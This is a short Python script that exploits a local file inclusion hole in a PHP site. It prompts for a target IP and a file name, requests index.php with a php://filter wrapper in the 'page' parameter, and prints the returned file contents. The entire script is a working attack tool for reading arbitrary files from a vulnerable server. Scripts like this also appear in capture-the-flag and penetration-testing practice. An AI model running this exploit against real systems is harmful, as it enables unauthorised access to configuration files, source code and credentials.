import requests

#Getting the IP and the file to be accessed from the user
IP = input("Enter the target IP: ")
File= input("Enter the file that you want to access using LFI: ")

def fetchingResponse(IP,File):
	if IP and File:
		print("Fetching the file....\n")
		response = requests.get(f"http://{IP}/index.php?page=php://filter/resource={File}")
		response_text = response.text
		print(response_text)
	else:
		print("Try again with the correct IP and file name")
		
fetchingResponse(IP,File)
